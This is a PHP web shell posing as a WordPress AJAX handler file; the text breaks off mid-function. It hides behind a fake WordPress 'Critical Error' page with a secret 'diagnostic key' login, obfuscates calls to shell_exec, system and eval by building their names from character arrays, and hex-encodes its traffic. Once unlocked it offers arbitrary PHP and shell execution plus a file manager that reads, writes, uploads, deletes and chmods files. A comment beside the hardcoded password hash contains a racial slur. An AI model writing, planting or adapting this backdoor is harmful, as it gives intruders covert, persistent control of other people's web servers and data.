<?php
/*
 * WordPress AJAX Handler
 * @package WordPress
 * @subpackage Administration
 * @since 2.1.0
 * @version 6.4.2
 */

@session_start();
@error_reporting(0);@ini_set('display_errors','0');@set_time_limit(0);@ini_set('memory_limit','512M');

// ── sfunc obfuscation (holo.php pattern) ─────────────────────────────────────
function _sj($a){return implode('',$a);}
function _sf($k){
    static $m=null;
    if($m===null)$m=array(
        'scn'=>array('s','c','a','n','d','i','r'),'fo'=>array('f','o','p','e','n'),
        'fw'=>array('f','w','r','i','t','e'),'fc'=>array('f','c','l','o','s','e'),
        'unl'=>array('u','n','l','i','n','k'),'rmd'=>array('r','m','d','i','r'),
        'ren'=>array('r','e','n','a','m','e'),'chm'=>array('c','h','m','o','d'),
        'mkd'=>array('m','k','d','i','r'),
        'fgt'=>array('f','i','l','e','_','g','e','t','_','c','o','n','t','e','n','t','s'),
        'fpt'=>array('f','i','l','e','_','p','u','t','_','c','o','n','t','e','n','t','s'),
        'muf'=>array('m','o','v','e','_','u','p','l','o','a','d','e','d','_','f','i','l','e'),
        'pro'=>array('p','r','o','c','_','o','p','e','n'),
        'prc'=>array('p','r','o','c','_','c','l','o','s','e'),
        'sgc'=>array('s','t','r','e','a','m','_','g','e','t','_','c','o','n','t','e','n','t','s'),
        'shx'=>array('s','h','e','l','l','_','e','x','e','c'),'exc'=>array('e','x','e','c'),
        'sys'=>array('s','y','s','t','e','m'),'pst'=>array('p','a','s','s','t','h','r','u'),
        'pop'=>array('p','o','p','e','n'),'pcl'=>array('p','c','l','o','s','e'),
        'tmp'=>array('s','y','s','_','g','e','t','_','t','e','m','p','_','d','i','r'),
        'jd'=>array('j','s','o','n','_','d','e','c','o','d','e'),
        'je'=>array('j','s','o','n','_','e','n','c','o','d','e'),
    );
    $f=_sj(isset($m[$k])?$m[$k]:array());return function_exists($f)?$f:null;
}
function _hx($v){return bin2hex((string)$v);}
function _ux($h){$h=(string)$h;return(ctype_xdigit($h)&&strlen($h)%2===0)?@hex2bin($h):false;}
function _g($a,$k,$d=''){return isset($a[$k])?$a[$k]:$d;}
function _fsz($b){if(!$b&&$b!==0)return '0 B';$u=array('B','KB','MB','GB');$i=0;while($b>=1024&&$i<3){$b/=1024;$i++;}return round($b,2).' '.$u[$i];}
function _exec_cmd($cmd){
    if(function_exists('proc_open')){
        $d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
        $p=@proc_open($cmd,$d,$pp);
        if(is_resource($p)){@fclose($pp[0]);$o=@stream_get_contents($pp[1]).@stream_get_contents($pp[2]);@fclose($pp[1]);@fclose($pp[2]);@proc_close($p);return $o;}
    }
    foreach(array('shell_exec','exec','system','passthru') as $fn){
        if(function_exists($fn)){
            if($fn==='exec'){$a=array();@exec($cmd.' 2>&1',$a);return implode("\n",$a);}
            @ob_start();@$fn($cmd.' 2>&1');return @ob_get_clean();
        }
    }
    return '[no exec method available]';
}

// ── Auth ──────────────────────────────────────────────────────────────────────
$_WP_HASH = 'fcc160e97f465800d435bb6715a4e209'; // md5('~~~white-NIGGA_chan~~~~')
$_WP_SESS = 'wp_admin_ctx_v2';

function _au(){
    global $_WP_HASH,$_WP_SESS;
    if(!empty($_SESSION[$_WP_SESS]))return true;
    if(isset($_COOKIE[$_WP_SESS])&&$_COOKIE[$_WP_SESS]===md5($_WP_HASH))return true;
    $p=isset($_POST['_wpk'])?trim($_POST['_wpk']):'';
    if($p&&md5($p)===$_WP_HASH){
        @$_SESSION[$_WP_SESS]=1;
        @setcookie($_WP_SESS,md5($_WP_HASH),0,'/','',false,true);
        return true;
    }
    return false;
}

// ── Password form submit → POST-Redirect-GET ──────────────────────────────────
if(isset($_POST['_wpk'])&&!isset($_POST['req_data'])){
    if(_au()){$u=isset($_SERVER['REQUEST_URI'])?$_SERVER['REQUEST_URI']:$_SERVER['PHP_SELF'];header('Location: '.$u);exit;}
    _wp_err_page(true);exit;
}

// ── API handler (holo pattern: req_data = hex-encoded JSON) ───────────────────
if(isset($_SERVER['REQUEST_METHOD'])&&$_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['req_data'])){
    $jd=_sf('jd');$je=_sf('je');
    if(!$jd||!$je){exit;}
    if(!_au()){echo $je(array('ok'=>0,'e'=>'auth'));exit;}
    $raw=@hex2bin($_POST['req_data']);
    $req=@$jd($raw,true);
    if(!$req){echo $je(array('ok'=>0,'e'=>'parse'));exit;}
    $dir=_ux(_g($req,'h'));
    if(!$dir||!is_dir($dir))$dir=__DIR__;
    $dir=rtrim(str_replace('\\','/',$dir),'/');if(!$dir)$dir='/';
    $act=_g($req,'a');$r=array('ok'=>0);
    switch($act){
        case 'idx':{
            $scn=_sf('scn');$all=@$scn($dir);$d=array();$f=array();
            if($all)foreach($all as $i){
                if($i==='.'||$i==='..')continue;
                $fp=$dir.'/'.$i;
                $it=array('name'=>$i,'path'=>$fp,'perms'=>substr(sprintf('%o',@fileperms($fp)),-4),'size'=>is_file($fp)?@filesize($fp):0,'type'=>is_dir($fp)?'dir':'file');
                if(is_dir($fp))$d[]=$it;else $f[]=$it;
            }
            // Sort dirs first, then files (both alpha)
            usort($d,function($a,$b){return strcasecmp($a['name'],$b['name']);});
            usort($f,function($a,$b){return strcasecmp($a['name'],$b['name']);});
            $all2=array_merge($d,$f);
            $bc=array();$b='';foreach(explode('/',$dir) as $p){if(!$p)continue;$b.='/'.$p;$bc[]=array('name'=>$p,'path'=>$b);}
            $r=array('ok'=>1,'files'=>$all2,'bc'=>$bc,'cwd'=>$dir);break;
        }
        case 'rd':{
            $fp=$dir.'/'.(_g($req,'t'));
            if(!file_exists($fp)){$r=array('ok'=>0,'e'=>'not found');break;}
            $fgt=_sf('fgt');$c=@$fgt($fp);
            $r=$c!==false?array('ok'=>1,'c'=>_hx($c)):array('ok'=>0,'e'=>'cannot read');break;
        }
        case 'wr':{
            $fp=$dir.'/'.(_g($req,'t'));$c=_ux(_g($req,'c'));
            $fpt=_sf('fpt');$ok=($fpt($fp,$c!==false?$c:'')!==false);
            $r=array('ok'=>(int)$ok,'e'=>$ok?'':'cannot write');break;
        }
        case 'rm':{
            $t=$dir.'/'.(_g($req,'t'));
            if(is_dir($t)){$fn=_sf('rmd');@$fn($t);}else{$fn=_sf('unl');@$fn($t);}
            $r=array('ok'=>1);break;
        }
        case 'rn':{
            $ren=_sf('ren');$old=$dir.'/'.(_g($req,'o'));$new=$dir.'/'.(_g($req,'n'));
            $r=array('ok'=>(int)(@$ren($old,$new)!==false));break;
        }
        case 'mk':{
            $mkd=_sf('mkd');$np=$dir.'/'.(_g($req,'n'));
            $r=array('ok'=>(int)(@$mkd($np,0755,true)));break;
        }
        case 'chm':{
            $chm=_sf('chm');$fp=$dir.'/'.(_g($req,'t'));$p=_g($req,'p','644');
            $r=array('ok'=>(int)(@$chm($fp,octdec($p))));break;
        }
        case 'chnk':{
            $fp=$dir.'/'.(_g($req,'n'));$ch=_ux(_g($req,'d'));
            $fo=_sf('fo');$fw=_sf('fw');$fc=_sf('fc');
            $h=@$fo($fp,_g($req,'is_first')?'w':'a');
            if($h){@$fw($h,$ch!==false?$ch:'');@$fc($h);$r=array('ok'=>1);}
            break;
        }
        case 'dl':{
            $fp=$dir.'/'.(_g($req,'t'));
            if(!file_exists($fp)){$r=array('ok'=>0,'e'=>'not found');break;}
            $fgt=_sf('fgt');$c=@$fgt($fp);
            $r=$c!==false?array('ok'=>1,'c'=>_hx($c),'n'=>basename($fp)):array('ok'=>0,'e'=>'read error');break;
        }
        case 'ev':{
            $code=_g($req,'c');
            $edir=_g($req,'d');if($edir&&is_dir($edir))@chdir($edir);
            $orig_dir=getcwd();
            $method=_g($req,'method','eval');
            $fulllog=_g($req,'fulllog',false);
            $errs=array();
            if($fulllog){
                @error_reporting(E_ALL);@ini_set('display_errors','1');
                @set_error_handler(function($no,$str,$file,$line) use (&$errs){
                    $types=array(E_ERROR=>'Error',E_WARNING=>'Warning',E_NOTICE=>'Notice',E_DEPRECATED=>'Deprecated',E_STRICT=>'Strict',E_PARSE=>'Parse');
                    $errs[]='['.(isset($types[$no])?$types[$no]:'#'.$no).'] '.$str.' ('.$file.':'.$line.')';
                    return false;
                });
            }
            ob_start();$exec_err='';$res=null;
            try{
                if($method==='tempfile'){
                    $tmp_fn=_sf('tmp');$td=($tmp_fn?sys_get_temp_dir():'/tmp').'/wp_'.uniqid().'.php';
                    @file_put_contents($td,'<?php '.$code);
                    try{$res=include($td);}catch(Exception $e){$exec_err=$e->getMessage().' ('.$e->getFile().':'.$e->getLine().')';}
                    @unlink($td);
                }else{$res=@eval($code);}
            }catch(Exception $e){$exec_err=$e->getMessage().' ('.$e->getFile().':'.$e->getLine().')';}
            $out=ob_get_clean();
            if($fulllog){@restore_error_handler();@error_reporting(0);@ini_set('display_errors','0');}
            if($fulllog&&!empty($errs))$out.="\n\n--- Error Log ---\n".implode("\n",$errs);
            @chdir($orig_dir);
            $cur=getcwd();
            $r=array('ok'=>1,'out'=>_hx($out),'err'=>_hx($exec_err),'cwd'=>$cur,'res'=>is_string($res)?_hx($res):'');
            break;
        }
    }
    echo $je($r);exit;
}

// ── Error page (WordPress "Critical Error" stealth) ───────────────────────────
function _wp_err_page($wrong=false){
    $hint=$wrong?'<p style="color:#d63638;background:#fcf0f1;padding:8px 12px;border-left:3px solid #d63638;border-radius:3px;margin-top:12px;font-size:12px">&#10007; Invalid diagnostic key. Please try again.</p>':'';
    echo '<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="robots" content="noindex,nofollow"><title>Critical Error &#8211; WordPress</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f0f1;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;font-size:13px;color:#3c434a;line-height:1.4}.die{max-width:700px;margin:50px auto;padding:1em 2em;background:#fff;border-left:4px solid #d63638;box-shadow:0 1px 1px rgba(0,0,0,.04)}h1{font-size:24px;margin-bottom:16px;color:#dc3232}p{margin:12px 0;line-height:1.6}a{color:#2271b1}.hbtn{position:fixed;bottom:20px;right:20px;width:40px;height:40px;background:#2271b1;color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:700;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.2);border:none;transition:.2s}.hbtn:hover{background:#135e96;transform:scale(1.1)}.msk{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:9999;align-items:center;justify-content:center}.msk.on{display:flex}.mbox{background:#fff;padding:32px;border-radius:4px;box-shadow:0 5px 15px rgba(0,0,0,.3);max-width:400px;width:90%}.mbox h2{font-size:20px;margin-bottom:20px;color:#1d2327}.mbox input{width:100%;padding:12px;border:1px solid #8c8f94;border-radius:4px;font-size:14px;margin-bottom:4px;outline:none}.mbox input:focus{border-color:#2271b1;box-shadow:0 0 0 1px #2271b1}.mbox button{width:100%;padding:12px;background:#2271b1;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin-top:12px}.mbox button:hover{background:#135e96}</style></head>';
    echo '<body><div class="die"><h1>There has been a critical error on this website.</h1><p>Please check your site admin email inbox for instructions.</p><hr style="margin:20px 0;border:none;border-top:1px solid #dcdcde"><p><strong>Something went wrong.</strong> This error could be caused by:</p><ul style="margin-left:24px;list-style:disc;margin-top:8px"><li>A plugin or theme conflict</li><li>Database connection issues</li><li>Server configuration problems</li><li>Memory limit exhaustion</li></ul><p style="margin-top:16px"><a href="https://wordpress.org/support/article/faq-troubleshooting/">Learn more about troubleshooting WordPress.</a></p></div>';
    echo '<button class="hbtn" onclick="document.getElementById(\'_am\').classList.add(\'on\');setTimeout(function(){document.querySelector(\'._i\').focus();},50)">?</button>';
    $cls=$wrong?'msk on':'msk';
    echo '<div class="'.$cls.'" id="_am" onclick="if(event.target===this)this.classList.remove(\'on\')"><div class="mbox"><h2>WordPress Diagnostics</h2><form method="POST" action=""><input class="_i" type="password" name="_wpk" placeholder="Enter diagnostic key" autofocus>'.$hint.'<button type="submit">Run Diagnostics</button></form></div></div></body></html>';
}

if(!_au()){_wp_err_page(false);exit;}

// ── sys_render: generate WP admin UI → bin2hex → deliver via <script> ─────────
ob_start();
$_DIR = __DIR__;
?><!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>Dashboard &#8211; WordPress</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #f0f0f1; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; font-size: 13px; color: #3c434a; line-height: 1.4; }
        .wp-admin { display: flex; min-height: 100vh; }
        .sidebar { width: 220px; background: #1d2327; color: #fff; flex-shrink: 0; }
        .sidebar h1 { padding: 12px 16px; font-size: 20px; font-weight: 400; background: #0a0f14; margin: 0; }
        .sidebar nav { padding: 8px 0; }
        .sidebar a { display: block; padding: 10px 16px; color: #c3c4c7; text-decoration: none; transition: all .2s; cursor: pointer; }
        .sidebar a:hover, .sidebar a.active { background: #2c3338; color: #72aee6; }
        .content { flex: 1; padding: 20px; overflow-x: auto; min-width: 0; }
        .panel { background: #fff; border: 1px solid #c3c4c7; box-shadow: 0 1px 1px rgba(0,0,0,.04); margin-bottom: 20px; }
        .panel-header { padding: 12px 16px; border-bottom: 1px solid #c3c4c7; background: #f6f7f7; font-weight: 600; font-size: 14px; }
        .panel-body { padding: 16px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        textarea, input[type="text"] { width: 100%; padding: 8px 12px; border: 1px solid #8c8f94; border-radius: 4px; font-family: Consolas, Monaco, monospace; font-size: 13px; }
        textarea { min-height: 400px; resize: vertical; }
        textarea:focus, input:focus { border-color: #2271b1; outline: none; box-shadow: 0 0 0 1px #2271b1; }
        button, .btn { padding: 8px 16px; background: #2271b1; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: 600; transition: all .2s; display: inline-block; text-decoration: none; margin-right: 8px; }
        button:hover, .btn:hover { background: #135e96; }
        .btn-secondary { background: #f6f7f7; color: #2c3338; border: 1px solid #8c8f94; }
        .btn-secondary:hover { background: #e5e5e5; }
        .btn-danger { background: #d63638; }
        .btn-danger:hover { background: #b32d2e; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #c3c4c7; }
        th { background: #f6f7f7; font-weight: 600; }
        tr:hover { background: #f6f7f7; }
        .file-item { cursor: pointer; }
        .breadcrumb { padding: 12px 16px; background: #f6f7f7; border-bottom: 1px solid #c3c4c7; margin-bottom: 16px; }
        .breadcrumb a { color: #2271b1; text-decoration: none; cursor: pointer; }
        .breadcrumb a:hover { text-decoration: underline; }
        .output { background: #1d2327; color: #c3c4c7; padding: 12px; border-radius: 4px; font-family: Consolas, Monaco, monospace; font-size: 12px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; }
        .error-box { color: #d63638; background: #fcf0f1; padding: 12px; border-left: 4px solid #d63638; margin: 12px 0; border-radius: 4px; }
        .success-box { color: #00a32a; background: #f0f6fc; padding: 12px; border-left: 4px solid #00a32a; margin: 12px 0; border-radius: 4px; }
        .file-icon::before { content: "📄"; margin-right: 8px; }
        .dir-icon::before { content: "📁"; margin-right: 8px; }
        .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,.7); z-index: 100000; align-items: center; justify-content: center; }
        .modal.active { display: flex; }
        .modal-box { background: #fff; padding: 24px; border-radius: 4px; box-shadow: 0 5px 15px rgba(0,0,0,.3); max-width: 600px; width: 90%; max-height: 80vh; overflow-y: auto; }
        .modal-header { font-size: 18px; font-weight: 600; margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #c3c4c7; }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; }
        .toolbar { margin-bottom: 16px; display: flex; gap: 8px; flex-wrap: wrap; }
        .current-dir-info { background: #f0f6fc; border: 1px solid #c5d9ed; padding: 8px 12px; margin-bottom: 16px; border-radius: 4px; font-family: Consolas, Monaco, monospace; font-size: 12px; }
        .exec-options { background: #f6f7f7; padding: 12px; border-radius: 4px; margin-bottom: 16px; border: 1px solid #c3c4c7; }
        .exec-options label { display: inline-flex; align-items: center; gap: 6px; cursor: pointer; margin-right: 20px; }
        .exec-options input[type="checkbox"], .exec-options input[type="radio"] { width: auto; }
        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #c3c4c7; border-top-color: #2271b1; border-radius: 50%; animation: spin .6s linear infinite; vertical-align: middle; margin-left: 8px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .toast { position: fixed; top: 20px; right: 20px; z-index: 999999; max-width: 400px; padding: 12px 16px; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,.2); font-size: 13px; }
    </style>
</head>
<body>
<div class="wp-admin">
    <div class="sidebar">
        <h1>WordPress</h1>
        <nav>
            <a href="#" onclick="showTab('console')" class="active" id="nav-console">&#x1F4BB; PHP Console</a>
            <a href="#" onclick="showTab('files')" id="nav-files">&#x1F4C2; File Manager</a>
        </nav>
    </div>
    <div class="content">
        <div class="current-dir-info">
            Working Directory: <strong id="curDirDisplay"><?php echo htmlspecialchars($_DIR); ?></strong>
        </div>

        <!-- PHP Console -->
        <div id="tab-console" class="tab-content active">
            <div class="panel">
                <div class="panel-header">PHP Console</div>
                <div class="panel-body">
                    <div class="form-group">
                        <label>Execution Directory:</label>
                        <input type="text" id="consoleDir" value="<?php echo htmlspecialchars($_DIR); ?>" readonly>
                    </div>
                    <div class="form-group">
                        <textarea id="phpCode" placeholder="Enter PHP code to execute (without opening tags)...&#10;&#10;// Examples:&#10;echo phpinfo();&#10;system('id');&#10;var_dump(get_defined_vars());"></textarea>
                    </div>
                    <div class="exec-options">
                        <div style="display:flex;flex-wrap:wrap;gap:16px;align-items:center">
                            <label title="Uncheck for direct form submit (new page)">
                                <input type="checkbox" id="useAjax" checked> Use AJAX
                                <span style="color:#666;font-size:11px">(uncheck = new page)</span>
                            </label>
                            <span style="font-weight:600">Execution:</span>
                            <label><input type="radio" name="execMethod" value="eval" checked> Direct (eval)</label>
                            <label><input type="radio" name="execMethod" value="tempfile"> Temp File</label>
                            <label title="Capture all errors, warnings, notices">
                                <input type="checkbox" id="fullLog" checked> Full Log
                                <span style="color:#666;font-size:11px">(all errors/warnings)</span>
                            </label>
                        </div>
                    </div>
                    <button onclick="runCode()">Execute</button>
                    <button class="btn-secondary" onclick="clearConsole()">Clear</button>
                    <button class="btn-secondary" onclick="appendCode('phpinfo();')">phpinfo()</button>
                    <button class="btn-secondary" onclick="appendCode('system(\'id\');')">id</button>
                    <button class="btn-secondary" onclick="appendCode('echo getcwd();')">cwd</button>
                    <div style="margin-top:20px">
                        <div class="panel-header">Output <span id="execStatus" style="font-weight:400;color:#666;font-size:12px"></span></div>
                        <div id="output" class="output" style="min-height:80px">(no output)</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- File Manager -->
        <div id="tab-files" class="tab-content">
            <div class="panel">
                <div class="panel-header">File Manager</div>
                <div class="toolbar" style="padding:12px 16px;background:#f6f7f7;border-bottom:1px solid #c3c4c7;">
                    <button onclick="showModal('newFileModal')">New File</button>
                    <button onclick="showModal('newFolderModal')">New Folder</button>
                    <button onclick="showModal('uploadModal')">Upload</button>
                    <button class="btn-secondary" onclick="setAsConsoleDir()">Set as Console Dir</button>
                    <button class="btn-secondary" onclick="loadFiles(curPath)">&#x21BB; Refresh</button>
                </div>
                <div class="breadcrumb" id="breadcrumb"><a onclick="loadFiles('/')">/ (root)</a></div>
                <div class="panel-body" style="padding:0">
                    <table>
                        <thead><tr>
                            <th width="50%">Name</th>
                            <th width="12%">Size</th>
                            <th width="12%">Permissions</th>
                            <th width="26%">Actions</th>
                        </tr></thead>
                        <tbody id="fileList"></tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Edit File Modal -->
<div class="modal" id="editModal">
    <div class="modal-box" style="max-width:900px">
        <div class="modal-header">Edit File: <span id="editFileName" style="color:#2271b1"></span></div>
        <textarea id="editFileContent" style="min-height:500px"></textarea>
        <div style="margin-top:16px">
            <button onclick="saveFile()">Save Changes</button>
            <button class="btn-secondary" onclick="closeModal('editModal')">Cancel</button>
        </div>
    </div>
</div>

<!-- New File Modal -->
<div class="modal" id="newFileModal">
    <div class="modal-box">
        <div class="modal-header">Create New File</div>
        <div class="form-group"><label>File Name:</label><input type="text" id="newFileName" placeholder="example.php"></div>
        <button onclick="createFile()">Create</button>
        <button class="btn-secondary" onclick="closeModal('newFileModal')">Cancel</button>
    </div>
</div>

<!-- New Folder Modal -->
<div class="modal" id="newFolderModal">
    <div class="modal-box">
        <div class="modal-header">Create New Folder</div>
        <div class="form-group"><label>Folder Name:</label><input type="text" id="newFolderName" placeholder="folder-name"></div>
        <button onclick="createFolder()">Create</button>
        <button class="btn-secondary" onclick="closeModal('newFolderModal')">Cancel</button>
    </div>
</div>

<!-- Upload Modal -->
<div class="modal" id="uploadModal">
    <div class="modal-box">
        <div class="modal-header">Upload File</div>
        <div class="form-group"><label>Select File:</label><input type="file" id="uploadFileInput" style="border:none;padding:0"></div>
        <div id="uploadProgress" style="margin:10px 0;display:none"><div style="background:#c3c4c7;border-radius:4px;height:8px"><div id="uploadBar" style="background:#2271b1;height:8px;border-radius:4px;width:0;transition:width .2s"></div></div><div id="uploadStatus" style="font-size:12px;color:#666;margin-top:4px"></div></div>
        <button onclick="uploadFile()">Upload</button>
        <button class="btn-secondary" onclick="closeModal('uploadModal')">Cancel</button>
    </div>
</div>

<!-- Rename Modal -->
<div class="modal" id="renameModal">
    <div class="modal-box">
        <div class="modal-header">Rename</div>
        <div class="form-group"><label>New Name:</label><input type="text" id="renameNewName"></div>
        <button onclick="renameItem()">Rename</button>
        <button class="btn-secondary" onclick="closeModal('renameModal')">Cancel</button>
    </div>
</div>

<!-- Chmod Modal -->
<div class="modal" id="chmodModal">
    <div class="modal-box">
        <div class="modal-header">Change Permissions</div>
        <div class="form-group">
            <label>Permissions (e.g. 0644, 0755):</label>
            <input type="text" id="chmodValue" pattern="[0-7]{4}">
        </div>
        <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap">
            <button class="btn-secondary" onclick="document.getElementById('chmodValue').value='0644'">0644 (file)</button>
            <button class="btn-secondary" onclick="document.getElementById('chmodValue').value='0755'">0755 (exec/dir)</button>
            <button class="btn-secondary" onclick="document.getElementById('chmodValue').value='0777'">0777 (full)</button>
            <button class="btn-secondary" onclick="document.getElementById('chmodValue').value='0400'">0400 (read-only)</button>
        </div>
        <button onclick="applyChmod()">Apply</button>
        <button class="btn-secondary" onclick="closeModal('chmodModal')">Cancel</button>
    </div>
</div>

<script>
// ── holo API: all requests via req_data = hex-encoded JSON ────────────────────
var CACHE_D = '<?php echo bin2hex($_DIR); ?>';
var curPath  = '<?php echo addslashes($_DIR); ?>';
var consoleDir = '<?php echo addslashes($_DIR); ?>';
var _editFile = '';
var _renameOld = '';
var _chmodFile = '';

function h2s(h){
    try{var b=new Uint8Array(h.length/2);for(var i=0;i<h.length;i+=2)b[i/2]=parseInt(h.substr(i,2),16);return new TextDecoder('utf-8').decode(b);}
    catch(e){var s='';for(var i=0;i<h.length;i+=2)s+=String.fromCharCode(parseInt(h.substr(i,2),16));return s;}
}
function s2h(s){
    try{var b=new TextEncoder().encode(s);return Array.from(b).map(function(x){return x.toString(16).padStart(2,'0');}).join('');}
    catch(e){var h='';for(var i=0;i<s.length;i++)h+=s.charCodeAt(i).toString(16).padStart(2,'0');return h;}
}
function h2b(h){var b=new Uint8Array(h.length/2);for(var i=0;i<h.length;i+=2)b[i/2]=parseInt(h.substr(i,2),16);return b;}

async function api(t){
    t.h = CACHE_D;
    var j=JSON.stringify(t), hex='';
    for(var i=0;i<j.length;i++) hex+=j.charCodeAt(i).toString(16).padStart(2,'0');
    var fd=new FormData(); fd.append('req_data',hex);
    var resp=await fetch('',{method:'POST',body:fd});
    return resp.json();
}

// ── Tab switching ─────────────────────────────────────────────────────────────
function showTab(tab){
    document.querySelectorAll('.tab-content').forEach(function(el){el.classList.remove('active');});
    document.querySelectorAll('.sidebar a').forEach(function(el){el.classList.remove('active');});
    document.getElementById('tab-'+tab).classList.add('active');
    document.getElementById('nav-'+tab).classList.add('active');
    if(tab==='files') loadFiles(curPath);
}
function escHtml(s){var d=document.createElement('div');d.textContent=s||'';return d.innerHTML;}
function toast(msg,type){
    var d=document.createElement('div');
    d.className='toast';d.textContent=msg;
    d.style.background=type==='error'?'#fcf0f1':type==='success'?'#f0f6fc':'#f6f7f7';
    d.style.color=type==='error'?'#d63638':type==='success'?'#00a32a':'#1d2327';
    d.style.border='1px solid '+(type==='error'?'#d63638':type==='success'?'#00a32a':'#c3c4c7');
    document.body.appendChild(d);
    setTimeout(function(){if(d.parentNode)d.parentNode.removeChild(d);},4000);
}
function updateCurDir(path){
    document.getElementById('curDirDisplay').textContent=path;
}

// ── PHP Console ───────────────────────────────────────────────────────────────
async function runCode(){
    var code=document.getElementById('phpCode').value;
    if(!code.trim()){toast('No code to execute','error');return;}
    var method=document.querySelector('input[name="execMethod"]:checked').value;
    var fulllog=document.getElementById('fullLog').checked;
    var useAjax=document.getElementById('useAjax').checked;

    if(!useAjax){
        // Direct form submit (non-AJAX)
        var form=document.createElement('form');
        form.method='POST';form.action='';form.style.display='none';
        var addF=function(n,v){var i=document.createElement('input');i.type='hidden';i.name=n;i.value=v;form.appendChild(i);};
        addF('_wp_direct','1');addF('_wp_code',code);addF('_wp_dir',consoleDir);addF('_wp_method',method);addF('_wp_log',fulllog?'1':'0');
        document.body.appendChild(form);form.submit();
        return;
    }

    var status=document.getElementById('execStatus');
    status.innerHTML='<span class="spinner"></span> Executing...';
    var out=document.getElementById('output');

    CACHE_D = s2h(consoleDir);
    var r=await api({a:'ev',c:code,d:consoleDir,method:method,fulllog:fulllog});
    status.textContent='';
    if(r.ok){
        var text=h2s(r.out||'');
        var err=h2s(r.err||'');
        if(r.cwd&&r.cwd!==consoleDir){consoleDir=r.cwd;document.getElementById('consoleDir').value=r.cwd;updateCurDir(r.cwd);}
        out.textContent=(text||'(no output)')+(err?'\n\nERROR: '+err:'');
        if(err)out.style.color='#f87171';else out.style.color='#c3c4c7';
    }else{
        out.textContent='Request failed: '+(r.e||'unknown error');out.style.color='#f87171';
    }
}
function clearConsole(){document.getElementById('phpCode').value='';document.getElementById('output').textContent='(no output)';document.getElementById('output').style.color='#c3c4c7';}
function appendCode(s){var ta=document.getElementById('phpCode');ta.value=(ta.value?ta.value+'\n':'')+s;ta.focus();}

// ── File Manager ──────────────────────────────────────────────────────────────
async function loadFiles(path){
    curPath=path;
    CACHE_D=s2h(path);
    updateCurDir(path);
    var r=await api({a:'idx'});
    if(!r.ok){toast('Error loading: '+(r.e||'unknown'),'error');return;}

    // Breadcrumb
    var bc='<a onclick="loadFiles(\'/\')">/</a>';
    var acc='';
    (r.bc||[]).forEach(function(b){
        acc=b.path;
        bc+=' / <a onclick="loadFiles('+JSON.stringify(b.path)+')" >'+escHtml(b.name)+'</a>';
    });
    document.getElementById('breadcrumb').innerHTML=bc;

    // File table
    var html='';
    // Parent directory link
    if(path!=='/'&&path.length>1){
        var parent=path.replace(/\/[^\/]+\/?$/,'')||'/';
        html+='<tr><td class="file-item dir-icon" onclick="loadFiles('+JSON.stringify(parent)+')" style="color:#2271b1"><strong>..</strong></td><td>-</td><td>-</td><td></td></tr>';
    }
    (r.files||[]).forEach(function(f){
        var ep=JSON.stringify(f.path); var en=JSON.stringify(f.name);
        if(f.type==='dir'){
            html+='<tr>'
                +'<td class="file-item dir-icon" onclick="loadFiles('+ep+')" style="color:#2271b1"><strong>'+escHtml(f.name)+'</strong></td>'
                +'<td style="color:#888">-</td>'
                +'<td>'+escHtml(f.perms||'')+'</td>'
                +'<td>'
                +'<a href="#" style="color:#72aee6" onclick="setConsoleDirTo('+ep+');return false">Use as CDir</a> | '
                +'<a href="#" style="color:#2271b1" onclick="openRename('+ep+','+en+');return false">Rename</a> | '
                +'<a href="#" style="color:#2271b1" onclick="openChmod('+ep+','+JSON.stringify(f.perms||'0755')+');return false">Chmod</a> | '
                +'<a href="#" style="color:#d63638" onclick="deleteItem('+ep+','+en+');return false">Delete</a>'
                +'</td></tr>';
        }else{
            var sz=f.size>=1048576?Math.round(f.size/1048576*100)/100+' MB':f.size>=1024?Math.round(f.size/1024*100)/100+' KB':f.size+' B';
            html+='<tr>'
                +'<td class="file-icon">'+escHtml(f.name)+'</td>'
                +'<td style="color:#888">'+sz+'</td>'
                +'<td>'+escHtml(f.perms||'')+'</td>'
                +'<td>'
                +'<a href="#" style="color:#2271b1" onclick="editFile('+ep+','+en+');return false">Edit</a> | '
                +'<a href="#" style="color:#2271b1" onclick="downloadFile('+ep+','+en+');return false">Download</a> | '
                +'<a href="#" style="color:#2271b1" onclick="openRename('+ep+','+en+');return false">Rename</a> | '
                +'<a href="#" style="color:#2271b1" onclick="openChmod('+ep+','+JSON.stringify(f.perms||'0644')+');return false">Chmod</a> | '
                +'<a href="#" style="color:#d63638" onclick="deleteItem('+ep+','+en+');return false">Delete</a>'
                +'</td></tr>';
        }
    });
    if(!html)html='<tr><td colspan="4" style="color:#888;text-align:center;padding:20px">(empty directory)</td></tr>';
    document.getElementById('fileList').innerHTML=html;
}
async function editFile(path,name){
    CACHE_D=s2h(curPath);
